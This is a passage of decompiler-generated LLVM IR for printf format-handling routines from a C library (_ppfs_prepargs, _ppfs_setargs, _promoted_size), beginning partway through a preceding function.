  br i1 %v1_804ab9a, label %dec_label_pc_804abb8, label %dec_label_pc_804ab9c

dec_label_pc_804ab9c:                             ; preds = %dec_label_pc_804ab97
  %v1_804ab9c = add i32 %v0_804ab9c27, 1
  store i32 %v1_804ab9c, i32* %eax.global-to-local, align 4
  %v1_804ab9d = inttoptr i32 %v1_804ab9c to i8*
  %v2_804ab9d = load i8, i8* %v1_804ab9d, align 1
  %v11_804ab9d = icmp eq i8 %v2_804ab9d, 37
  br i1 %v11_804ab9d, label %dec_label_pc_804abb8, label %dec_label_pc_804aba2

dec_label_pc_804aba2:                             ; preds = %dec_label_pc_804ab9c
  %v1_804aba5 = load i32, i32* @ebx, align 4
  %v2_804aba5 = inttoptr i32 %v1_804aba5 to i32*
  store i32 %v1_804ab9c, i32* %v2_804aba5, align 4
  %v0_804aba7 = load i32, i32* @ebx, align 4
  %v1_804aba8 = inttoptr i32 %v0_804aba7 to i32*
  %v2_804aba8 = call i32 @_ppfs_parsespec(i32* %v1_804aba8)
  store i32 %v2_804aba8, i32* %eax.global-to-local, align 4
  %v2_804abb0 = icmp slt i32 %v2_804aba8, 0
  br i1 %v2_804abb0, label %dec_label_pc_804abc3, label %dec_label_pc_804abb4

dec_label_pc_804abb4:                             ; preds = %dec_label_pc_804aba2
  %v0_804abb4 = load i32, i32* @ebx, align 4
  %v1_804abb4 = inttoptr i32 %v0_804abb4 to i32*
  %v2_804abb4 = load i32, i32* %v1_804abb4, align 4
  %v4_804abb9.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804abb9.backedge

dec_label_pc_804abb8:                             ; preds = %dec_label_pc_804ab9c, %dec_label_pc_804ab97
  %v0_804abb8 = phi i32 [ %v1_804ab9c, %dec_label_pc_804ab9c ], [ %v0_804ab9c27, %dec_label_pc_804ab97 ]
  %v1_804abb8 = add i32 %v0_804abb8, 1
  br label %dec_label_pc_804abb9.backedge

dec_label_pc_804abb9.backedge:                    ; preds = %dec_label_pc_804abb8, %dec_label_pc_804abb4
  %v4_804abb9.be = phi i32 [ %v4_804abb9.pre.pre, %dec_label_pc_804abb4 ], [ %v6_804abb929, %dec_label_pc_804abb8 ]
  %v0_804ab9c.be = phi i32 [ %v2_804abb4, %dec_label_pc_804abb4 ], [ %v1_804abb8, %dec_label_pc_804abb8 ]
  store i32 %v0_804ab9c.be, i32* %eax.global-to-local, align 4
  %v1_804abb9 = inttoptr i32 %v0_804ab9c.be to i8*
  %v2_804abb9 = load i8, i8* %v1_804abb9, align 1
  %v3_804abb9 = zext i8 %v2_804abb9 to i32
  %v5_804abb9 = and i32 %v4_804abb9.be, -256
  %v6_804abb9 = or i32 %v3_804abb9, %v5_804abb9
  store i32 %v6_804abb9, i32* %edx.global-to-local, align 4
  %v4_804abbb = icmp eq i8 %v2_804abb9, 0
  %v1_804abbd = icmp eq i1 %v4_804abbb, false
  br i1 %v1_804abbd, label %dec_label_pc_804ab97, label %dec_label_pc_804abb9.dec_label_pc_804abbf_crit_edge

dec_label_pc_804abb9.dec_label_pc_804abbf_crit_edge: ; preds = %dec_label_pc_804abb9.backedge
  %v0_804abbf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804abbf

dec_label_pc_804abbf:                             ; preds = %dec_label_pc_804abb9.dec_label_pc_804abbf_crit_edge, %dec_label_pc_804ab8e
  %v0_804abbf = phi i32 [ %v0_804abbf.pre, %dec_label_pc_804abb9.dec_label_pc_804abbf_crit_edge ], [ %v0_804ab8e, %dec_label_pc_804ab8e ]
  %v1_804abbf = load i32, i32* @ebx, align 4
  %v2_804abbf = inttoptr i32 %v1_804abbf to i32*
  store i32 %v0_804abbf, i32* %v2_804abbf, align 4
  br label %dec_label_pc_804abc3

dec_label_pc_804abc3:                             ; preds = %dec_label_pc_804aba2, %dec_label_pc_804abbf
  %storemerge = phi i32 [ 0, %dec_label_pc_804abbf ], [ -1, %dec_label_pc_804aba2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804abc3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804abc3, i32* @edx, align 4
  %v2_804abc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804abc4, i32* @ebx, align 4
  store i32 %v0_804ab58, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804abb9, { 1, 0 }
  uselistorder i8 %v2_804abb9, { 1, 2, 0 }
  uselistorder i32 %v0_804ab9c.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ab9c27, { 1, 0 }
  uselistorder i32 %v0_804ab8e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ab8b, { 0, 2, 1 }
  uselistorder i32 %v1_804ab88, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804abc3, { 1, 0 }
  uselistorder label %dec_label_pc_804ab97, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804abc8 = load i32, i32* @esi, align 4
  %v0_804abc9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804abd5 = add i32 %arg1, 24
  %v2_804abd5 = inttoptr i32 %v1_804abd5 to i32*
  %v3_804abd5 = load i32, i32* %v2_804abd5, align 4
  %v2_804abd8 = add i32 %arg1, 76
  %v3_804abd8 = inttoptr i32 %v2_804abd8 to i32*
  store i32 %arg2, i32* %v3_804abd8, align 4
  %tmp8 = icmp slt i32 %v3_804abd5, 1
  br i1 %tmp8, label %dec_label_pc_804ac06, label %dec_label_pc_804abdf

dec_label_pc_804abdf:                             ; preds = %entry
  %v1_804abe2 = load i32, i32* @ebx, align 4
  %v2_804abe2 = add i32 %v1_804abe2, 28
  %v3_804abe2 = inttoptr i32 %v2_804abe2 to i32*
  store i32 %v3_804abd5, i32* %v3_804abe2, align 4
  %v0_804abe5 = load i32, i32* @ebx, align 4
  %v1_804abe5 = add i32 %v0_804abe5, 24
  %v2_804abe5 = inttoptr i32 %v1_804abe5 to i32*
  store i32 0, i32* %v2_804abe5, align 4
  %v0_804abec = load i32, i32* @ebx, align 4
  %v1_804abec = add i32 %v0_804abec, 4
  %v2_804abec = inttoptr i32 %v1_804abec to i32*
  store i32 0, i32* %v2_804abec, align 4
  %v0_804abf3 = load i32, i32* @ebx, align 4
  %v1_804abf3 = add i32 %v0_804abf3, 8
  %v2_804abf3 = inttoptr i32 %v1_804abf3 to i32*
  store i32 0, i32* %v2_804abf3, align 4
  %v0_804abfa = load i32, i32* @ebx, align 4
  %v1_804abfb = call i32 @_ppfs_setargs(i32 %v0_804abfa)
  %v1_804ac00 = load i32, i32* @ebx, align 4
  %v2_804ac00 = add i32 %v1_804ac00, 24
  %v3_804ac00 = inttoptr i32 %v2_804ac00 to i32*
  store i32 %v3_804abd5, i32* %v3_804ac00, align 4
  br label %dec_label_pc_804ac06

dec_label_pc_804ac06:                             ; preds = %entry, %dec_label_pc_804abdf
  %v2_804ac06 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804abc9, i32* @ebx, align 4
  store i32 %v0_804abc8, i32* @esi, align 4
  ret i32 %v2_804ac06

; uselistorder directives
  uselistorder i32 %v3_804abd5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ac06, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ac0d = load i32, i32* @ebx, align 4
  store i32 %v0_804ac0d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804ac12 = add i32 %arg1, 80
  store i32 %v1_804ac12, i32* %ebx.global-to-local, align 4
  %v1_804ac15 = add i32 %arg1, 24
  %v2_804ac15 = inttoptr i32 %v1_804ac15 to i32*
  %v3_804ac15 = load i32, i32* %v2_804ac15, align 4
  %v4_804ac15 = icmp eq i32 %v3_804ac15, 0
  %v1_804ac19 = icmp eq i1 %v4_804ac15, false
  %v1_804accf = add i32 %arg1, 8
  %v2_804accf = inttoptr i32 %v1_804accf to i32*
  %v3_804accf = load i32, i32* %v2_804accf, align 4
  %v8_804accf = icmp eq i32 %v3_804accf, -2147483648
  %v1_804acd6 = icmp eq i1 %v8_804accf, false
  br i1 %v1_804ac19, label %dec_label_pc_804accf, label %dec_label_pc_804ac1f

dec_label_pc_804ac1f:                             ; preds = %entry
  br i1 %v1_804acd6, label %dec_label_pc_804ac39, label %dec_label_pc_804ac28

dec_label_pc_804ac28:                             ; preds = %dec_label_pc_804ac1f
  %v1_804ac28 = add i32 %arg1, 76
  %v2_804ac28 = inttoptr i32 %v1_804ac28 to i32*
  %v3_804ac28 = load i32, i32* %v2_804ac28, align 4
  store i32 %v3_804ac28, i32* %eax.global-to-local, align 4
  %v1_804ac2b = add i32 %v3_804ac28, 4
  store i32 %v1_804ac2b, i32* %edx.global-to-local, align 4
  store i32 %v1_804ac2b, i32* %v2_804ac28, align 4
  %v0_804ac31 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac31 = inttoptr i32 %v0_804ac31 to i32*
  %v2_804ac31 = load i32, i32* %v1_804ac31, align 4
  store i32 %v2_804ac31, i32* %eax.global-to-local, align 4
  %v1_804ac33 = load i32, i32* @ecx, align 4
  %v2_804ac33 = add i32 %v1_804ac33, 80
  %v3_804ac33 = inttoptr i32 %v2_804ac33 to i32*
  store i32 %v2_804ac31, i32* %v3_804ac33, align 4
  %v0_804ac36 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac36 = load i32, i32* @ecx, align 4
  %v2_804ac36 = add i32 %v1_804ac36, 8
  %v3_804ac36 = inttoptr i32 %v2_804ac36 to i32*
  store i32 %v0_804ac36, i32* %v3_804ac36, align 4
  %v0_804ac39.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ac39

dec_label_pc_804ac39:                             ; preds = %dec_label_pc_804ac1f, %dec_label_pc_804ac28
  %v1_804ac48 = phi i32 [ %arg1, %dec_label_pc_804ac1f ], [ %v0_804ac39.pre, %dec_label_pc_804ac28 ]
  %v1_804ac39 = add i32 %v1_804ac48, 4
  %v2_804ac39 = inttoptr i32 %v1_804ac39 to i32*
  %v3_804ac39 = load i32, i32* %v2_804ac39, align 4
  %v8_804ac39 = icmp eq i32 %v3_804ac39, -2147483648
  %v1_804ac40 = icmp eq i1 %v8_804ac39, false
  br i1 %v1_804ac40, label %dec_label_pc_804ac53, label %dec_label_pc_804ac42

dec_label_pc_804ac42:                             ; preds = %dec_label_pc_804ac39
  %v1_804ac42 = add i32 %v1_804ac48, 76
  %v2_804ac42 = inttoptr i32 %v1_804ac42 to i32*
  %v3_804ac42 = load i32, i32* %v2_804ac42, align 4
  store i32 %v3_804ac42, i32* %eax.global-to-local, align 4
  %v1_804ac45 = add i32 %v3_804ac42, 4
  store i32 %v1_804ac45, i32* %edx.global-to-local, align 4
  store i32 %v1_804ac45, i32* %v2_804ac42, align 4
  %v0_804ac4b = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac4b = inttoptr i32 %v0_804ac4b to i32*
  %v2_804ac4b = load i32, i32* %v1_804ac4b, align 4
  store i32 %v2_804ac4b, i32* %eax.global-to-local, align 4
  %v1_804ac4d = load i32, i32* @ecx, align 4
  %v2_804ac4d = add i32 %v1_804ac4d, 80
  %v3_804ac4d = inttoptr i32 %v2_804ac4d to i32*
  store i32 %v2_804ac4b, i32* %v3_804ac4d, align 4
  %v0_804ac50 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac50 = load i32, i32* @ecx, align 4
  %v2_804ac50 = add i32 %v1_804ac50, 4
  %v3_804ac50 = inttoptr i32 %v2_804ac50 to i32*
  store i32 %v0_804ac50, i32* %v3_804ac50, align 4
  %v1_804acc817.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ac53

dec_label_pc_804ac53:                             ; preds = %dec_label_pc_804ac39, %dec_label_pc_804ac42
  %v1_804acc817 = phi i32 [ %v1_804ac48, %dec_label_pc_804ac39 ], [ %v1_804acc817.pre, %dec_label_pc_804ac42 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804acc818 = add i32 %v1_804acc817, 28
  %v3_804acc819 = inttoptr i32 %v2_804acc818 to i32*
  %v4_804acc820 = load i32, i32* %v3_804acc819, align 4
  %v5_804accb21 = icmp sgt i32 %v4_804acc820, 0
  br i1 %v5_804accb21, label %dec_label_pc_804ac57, label %dec_label_pc_804acfd.loopexit

dec_label_pc_804ac57:                             ; preds = %dec_label_pc_804ac53, %dec_label_pc_804acc7
  %v1_804acc823 = phi i32 [ %v1_804acc8, %dec_label_pc_804acc7 ], [ %v1_804acc817, %dec_label_pc_804ac53 ]
  %v1_804ac5722 = phi i32 [ %v1_804acc7, %dec_label_pc_804acc7 ], [ 0, %dec_label_pc_804ac53 ]
  %v2_804ac57 = mul i32 %v1_804ac5722, 4
  %v3_804ac57 = add i32 %v2_804ac57, 40
  %v4_804ac57 = add i32 %v3_804ac57, %v1_804acc823
  %v5_804ac57 = inttoptr i32 %v4_804ac57 to i32*
  %v6_804ac57 = load i32, i32* %v5_804ac57, align 4
  store i32 %v6_804ac57, i32* %eax.global-to-local, align 4
  %v1_804ac5b = add i32 %v6_804ac57, -8
  %v9_804ac5b = icmp eq i32 %v1_804ac5b, 0
  br i1 %v9_804ac5b, label %dec_label_pc_804acc7, label %dec_label_pc_804ac60

dec_label_pc_804ac60:                             ; preds = %dec_label_pc_804ac57
  %v10_804ac5b = icmp slt i32 %v1_804ac5b, 0
  %v6_804ac5b = sub i32 7, %v6_804ac57
  %v7_804ac5b = and i32 %v6_804ac5b, %v6_804ac57
  %v8_804ac5b = icmp slt i32 %v7_804ac5b, 0
  %v1_804ac60 = add i32 %v1_804acc823, 76
  %v2_804ac60 = inttoptr i32 %v1_804ac60 to i32*
  %v3_804ac60 = load i32, i32* %v2_804ac60, align 4
  store i32 %v3_804ac60, i32* %edx.global-to-local, align 4
  %v3_804ac63 = icmp eq i1 %v10_804ac5b, %v8_804ac5b
  br i1 %v3_804ac63, label %dec_label_pc_804ac73, label %dec_label_pc_804ac65

dec_label_pc_804ac65:                             ; preds = %dec_label_pc_804ac60
  %tmp15 = icmp slt i32 %v6_804ac57, 3
  %v9_804ac6c = icmp eq i32 %v6_804ac57, 7
  %v1_804ac6f = icmp eq i1 %v9_804ac6c, false
  %or.cond = or i1 %tmp15, %v1_804ac6f
  br i1 %or.cond, label %dec_label_pc_804acba, label %dec_label_pc_804ac9c

dec_label_pc_804ac73:                             ; preds = %dec_label_pc_804ac60
  %tmp16 = icmp sgt i32 %v6_804ac57, 1024
  br i1 %tmp16, label %dec_label_pc_804ac7c, label %dec_label_pc_804acba

dec_label_pc_804ac7c:                             ; preds = %dec_label_pc_804ac73
  %v6_804ac7c = icmp eq i32 %v6_804ac57, 2048
  br i1 %v6_804ac7c, label %dec_label_pc_804ac8c, label %dec_label_pc_804ac83

dec_label_pc_804ac83:                             ; preds = %dec_label_pc_804ac7c
  %v9_804ac83 = icmp eq i32 %v6_804ac57, 2055
  %v1_804ac88 = icmp eq i1 %v9_804ac83, false
  br i1 %v1_804ac88, label %dec_label_pc_804acba, label %dec_label_pc_804acab

dec_label_pc_804ac8c:                             ; preds = %dec_label_pc_804ac7c
  %v1_804ac8c = add i32 %v3_804ac60, 8
  store i32 %v1_804ac8c, i32* %eax.global-to-local, align 4
  store i32 %v1_804ac8c, i32* %v2_804ac60, align 4
  %v0_804ac92 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ac92 = inttoptr i32 %v0_804ac92 to i32*
  %v2_804ac92 = load i32, i32* %v1_804ac92, align 4
  store i32 %v2_804ac92, i32* %eax.global-to-local, align 4
  %v1_804ac94 = add i32 %v0_804ac92, 4
  %v2_804ac94 = inttoptr i32 %v1_804ac94 to i32*
  %v3_804ac94 = load i32, i32* %v2_804ac94, align 4
  store i32 %v3_804ac94, i32* %edx.global-to-local, align 4
  %v1_804ac97 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ac97 = add i32 %v1_804ac97, 4
  %v3_804ac97 = inttoptr i32 %v2_804ac97 to i32*
  store i32 %v3_804ac94, i32* %v3_804ac97, align 4
  %v0_804acc2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804acc2

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac65
  %v3_804ac9c = load i32, i32* %v2_804ac60, align 4
  store i32 %v3_804ac9c, i32* %edx.global-to-local, align 4
  %v1_804ac9f = add i32 %v3_804ac9c, 8
  store i32 %v1_804ac9f, i32* %eax.global-to-local, align 4
  store i32 %v1_804ac9f, i32* %v2_804ac60, align 4
  %v0_804aca5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aca5 = inttoptr i32 %v0_804aca5 to double*
  %v2_804aca5 = load double, double* %v1_804aca5, align 4
  %v2_804aca7 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804aca7 = inttoptr i32 %v2_804aca7 to double*
  store double %v2_804aca5, double* %v4_804aca7, align 4
  br label %dec_label_pc_804acc4

dec_label_pc_804acab:                             ; preds = %dec_label_pc_804ac83
  %v3_804acab = load i32, i32* %v2_804ac60, align 4
  store i32 %v3_804acab, i32* %edx.global-to-local, align 4
  %v1_804acae = add i32 %v3_804acab, 12
  store i32 %v1_804acae, i32* %eax.global-to-local, align 4
  store i32 %v1_804acae, i32* %v2_804ac60, align 4
  %v0_804acb4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804acb4 = inttoptr i32 %v0_804acb4 to x86_fp80*
  %v2_804acb4 = load x86_fp80, x86_fp80* %v1_804acb4, align 4
  %v2_804acb6 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804acb6 = inttoptr i32 %v2_804acb6 to x86_fp80*
  store x86_fp80 %v2_804acb4, x86_fp80* %v3_804acb6, align 4
  br label %dec_label_pc_804acc4

dec_label_pc_804acba:                             ; preds = %dec_label_pc_804ac65, %dec_label_pc_804ac73, %dec_label_pc_804ac83
  %v1_804acba = add i32 %v3_804ac60, 4
  store i32 %v1_804acba, i32* %eax.global-to-local, align 4
  store i32 %v1_804acba, i32* %v2_804ac60, align 4
  %v0_804acc0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804acc0 = inttoptr i32 %v0_804acc0 to i32*
  %v2_804acc0 = load i32, i32* %v1_804acc0, align 4
  store i32 %v2_804acc0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804acc2

dec_label_pc_804acc2:                             ; preds = %dec_label_pc_804ac8c, %dec_label_pc_804acba
  %v0_804acc2 = phi i32 [ %v0_804acc2.pre, %dec_label_pc_804ac8c ], [ %v2_804acc0, %dec_label_pc_804acba ]
  %v1_804acc2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804acc2 = inttoptr i32 %v1_804acc2 to i32*
  store i32 %v0_804acc2, i32* %v2_804acc2, align 4
  %v0_804acc4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804acc4

dec_label_pc_804acc4:                             ; preds = %dec_label_pc_804acab, %dec_label_pc_804ac9c, %dec_label_pc_804acc2
  %v0_804acc4 = phi i32 [ %v2_804acb6, %dec_label_pc_804acab ], [ %v2_804aca7, %dec_label_pc_804ac9c ], [ %v0_804acc4.pre, %dec_label_pc_804acc2 ]
  %v1_804acc4 = add i32 %v0_804acc4, 12
  store i32 %v1_804acc4, i32* %ebx.global-to-local, align 4
  %v0_804acc7.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804acc8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804acc7

dec_label_pc_804acc7:                             ; preds = %dec_label_pc_804ac57, %dec_label_pc_804acc4
  %v1_804acc8 = phi i32 [ %v1_804acc823, %dec_label_pc_804ac57 ], [ %v1_804acc8.pre, %dec_label_pc_804acc4 ]
  %v0_804acc7 = phi i32 [ %v1_804ac5722, %dec_label_pc_804ac57 ], [ %v0_804acc7.pre, %dec_label_pc_804acc4 ]
  %v1_804acc7 = add i32 %v0_804acc7, 1
  store i32 %v1_804acc7, i32* %esi.global-to-local, align 4
  %v2_804acc8 = add i32 %v1_804acc8, 28
  %v3_804acc8 = inttoptr i32 %v2_804acc8 to i32*
  %v4_804acc8 = load i32, i32* %v3_804acc8, align 4
  %v5_804accb = icmp slt i32 %v1_804acc7, %v4_804acc8
  br i1 %v5_804accb, label %dec_label_pc_804ac57, label %dec_label_pc_804acfd.loopexit

dec_label_pc_804accf:                             ; preds = %entry
  br i1 %v1_804acd6, label %dec_label_pc_804ace6, label %dec_label_pc_804acd8

dec_label_pc_804acd8:                             ; preds = %dec_label_pc_804accf
  %v1_804acd8 = add i32 %arg1, 36
  %v2_804acd8 = inttoptr i32 %v1_804acd8 to i8*
  %v3_804acd8 = load i8, i8* %v2_804acd8, align 1
  %v2_804acdc = zext i8 %v3_804acd8 to i32
  %v3_804acdc = mul nuw nsw i32 %v2_804acdc, 12
  store i32 %v3_804acdc, i32* %eax.global-to-local, align 4
  %v2_804acdf = add i32 %arg1, 68
  %v3_804acdf = add i32 %v2_804acdf, %v3_804acdc
  %v4_804acdf = inttoptr i32 %v3_804acdf to i32*
  %v5_804acdf = load i32, i32* %v4_804acdf, align 4
  store i32 %v5_804acdf, i32* %eax.global-to-local, align 4
  store i32 %v5_804acdf, i32* %v2_804accf, align 4
  %v0_804ace6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ace6

dec_label_pc_804ace6:                             ; preds = %dec_label_pc_804accf, %dec_label_pc_804acd8
  %v1_804acfa = phi i32 [ %arg1, %dec_label_pc_804accf ], [ %v0_804ace6.pre, %dec_label_pc_804acd8 ]
  %v1_804ace6 = add i32 %v1_804acfa, 4
  %v2_804ace6 = inttoptr i32 %v1_804ace6 to i32*
  %v3_804ace6 = load i32, i32* %v2_804ace6, align 4
  %v8_804ace6 = icmp eq i32 %v3_804ace6, -2147483648
  %v1_804aced = icmp eq i1 %v8_804ace6, false
  br i1 %v1_804aced, label %dec_label_pc_804acfd, label %dec_label_pc_804acef

dec_label_pc_804acef:                             ; preds = %dec_label_pc_804ace6
  %v1_804acef = add i32 %v1_804acfa, 37
  %v2_804acef = inttoptr i32 %v1_804acef to i8*
  %v3_804acef = load i8, i8* %v2_804acef, align 1
  %v2_804acf3 = zext i8 %v3_804acef to i32
  %v3_804acf3 = mul nuw nsw i32 %v2_804acf3, 12
  store i32 %v3_804acf3, i32* %eax.global-to-local, align 4
  %v1_804acf6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804acf6 = add nsw i32 %v3_804acf3, -12
  %v3_804acf6 = add i32 %v2_804acf6, %v1_804acf6
  %v4_804acf6 = inttoptr i32 %v3_804acf6 to i32*
  %v5_804acf6 = load i32, i32* %v4_804acf6, align 4
  store i32 %v5_804acf6, i32* %eax.global-to-local, align 4
  store i32 %v5_804acf6, i32* %v2_804ace6, align 4
  %v0_804acfd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804acfd

dec_label_pc_804acfd.loopexit:                    ; preds = %dec_label_pc_804acc7, %dec_label_pc_804ac53
  %v1_804acc8.lcssa = phi i32 [ %v1_804acc817, %dec_label_pc_804ac53 ], [ %v1_804acc8, %dec_label_pc_804acc7 ]
  br label %dec_label_pc_804acfd

dec_label_pc_804acfd:                             ; preds = %dec_label_pc_804acfd.loopexit, %dec_label_pc_804ace6, %dec_label_pc_804acef
  %v10_804ad04 = phi i32 [ %v1_804acc8.lcssa, %dec_label_pc_804acfd.loopexit ], [ %v1_804acfa, %dec_label_pc_804ace6 ], [ %v0_804acfd.pre, %dec_label_pc_804acef ]
  %v1_804acfd = add i32 %v10_804ad04, 8
  %v2_804acfd = inttoptr i32 %v1_804acfd to i32*
  %v3_804acfd = load i32, i32* %v2_804acfd, align 4
  store i32 %v3_804acfd, i32* %eax.global-to-local, align 4
  %v2_804ad00 = icmp slt i32 %v3_804acfd, 0
  %v1_804ad02 = icmp eq i1 %v2_804ad00, false
  br i1 %v1_804ad02, label %dec_label_pc_804ad18, label %dec_label_pc_804ad04

dec_label_pc_804ad04:                             ; preds = %dec_label_pc_804acfd
  %v1_804ad04 = add i32 %v10_804ad04, 16
  %v2_804ad04 = inttoptr i32 %v1_804ad04 to i32*
  %v3_804ad04 = load i32, i32* %v2_804ad04, align 4
  %v4_804ad04 = or i32 %v3_804ad04, 8
  store i32 %v4_804ad04, i32* %v2_804ad04, align 4
  %v0_804ad08 = load i32, i32* @ecx, align 4
  %v1_804ad08 = add i32 %v0_804ad08, 16
  %v2_804ad08 = inttoptr i32 %v1_804ad08 to i32*
  %v3_804ad08 = load i32, i32* %v2_804ad08, align 4
  %v4_804ad08 = and i32 %v3_804ad08, -2
  store i32 %v4_804ad08, i32* %v2_804ad08, align 4
  %v0_804ad0c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad0c = sub i32 0, %v0_804ad0c
  store i32 %v1_804ad0c, i32* %eax.global-to-local, align 4
  %v1_804ad0e = load i32, i32* @ecx, align 4
  %v2_804ad0e = add i32 %v1_804ad0e, 8
  %v3_804ad0e = inttoptr i32 %v2_804ad0e to i32*
  store i32 %v1_804ad0c, i32* %v3_804ad0e, align 4
  %v0_804ad11 = load i32, i32* @ecx, align 4
  %v1_804ad11 = add i32 %v0_804ad11, 20
  %v2_804ad11 = inttoptr i32 %v1_804ad11 to i32*
  store i32 32, i32* %v2_804ad11, align 4
  %v0_804ad1a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad18

dec_label_pc_804ad18:                             ; preds = %dec_label_pc_804acfd, %dec_label_pc_804ad04
  %v0_804ad1a = phi i32 [ %v3_804acfd, %dec_label_pc_804acfd ], [ %v0_804ad1a.pre, %dec_label_pc_804ad04 ]
  %v2_804ad18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ad18, i32* @ebx, align 4
  ret i32 %v0_804ad1a

; uselistorder directives
  uselistorder i32 %v3_804acf3, { 1, 0 }
  uselistorder i32 %v3_804acdc, { 1, 0 }
  uselistorder i32 %v1_804acc7, { 2, 1, 0 }
  uselistorder i32 %v1_804acc8, { 0, 2, 1 }
  uselistorder i32 %v3_804ac60, { 1, 0, 2 }
  uselistorder i32* %v2_804ac60, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804ac5b, { 1, 0 }
  uselistorder i32 %v6_804ac57, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804ac5722, { 1, 0 }
  uselistorder i1 %v1_804acd6, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804ad18, { 1, 0 }
  uselistorder label %dec_label_pc_804acfd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ace6, { 1, 0 }
  uselistorder label %dec_label_pc_804acc7, { 1, 0 }
  uselistorder label %dec_label_pc_804acc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804acc2, { 1, 0 }
  uselistorder label %dec_label_pc_804acba, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ac57, { 1, 0 }
  uselistorder label %dec_label_pc_804ac53, { 1, 0 }
  uselistorder label %dec_label_pc_804ac39, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ad1c = load i32, i32* @eax, align 4
  br label %dec_label_pc_804ad23

dec_label_pc_804ad23:                             ; preds = %dec_label_pc_804ad23, %entry
  %v0_804ad23 = phi i32 [ ptrtoint (i8** @global_var_805164a.323 to i32), %entry ], [ %v1_804ad23, %dec_label_pc_804ad23 ]
  %v1_804ad23 = add i32 %v0_804ad23, -2
  %v1_804ad26 = inttoptr i32 %v1_804ad23 to i16*
  %v2_804ad26 = load i16, i16* %v1_804ad26, align 2
  %v3_804ad26 = sext i16 %v2_804ad26 to i32
  %v12_804ad29 = icmp ne i32 %v3_804ad26, %v0_804ad1c
  %v6_804ad33 = icmp ugt i32 %v1_804ad23, ptrtoint (i32* @global_var_8051632.324 to i32)
  %or.cond = and i1 %v6_804ad33, %v12_804ad29
  br i1 %or.cond, label %dec_label_pc_804ad23, label %dec_label_pc_804ad35

dec_label_pc_804ad35:                             ; preds = %dec_label_pc_804ad23
  %.pre = add i32 %v0_804ad23, -134551092
  %v2_804ad3b = sdiv i32 %.pre, 2
  store i32 %v2_804ad3b, i32* @edx, align 4
  %v1_804ad3d = add i32 %v2_804ad3b, ptrtoint (i8** @global_var_805164a.323 to i32)
  %v2_804ad3d = inttoptr i32 %v1_804ad3d to i8*
  %v3_804ad3d = load i8, i8* %v2_804ad3d, align 1
  %v4_804ad3d = zext i8 %v3_804ad3d to i32
  ret i32 %v4_804ad3d

; uselistorder directives
  uselistorder i32 %v2_804ad3b, { 1, 0 }
  uselistorder i32 %v1_804ad23, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805164a.323 to i32), { 1, 0 }
}

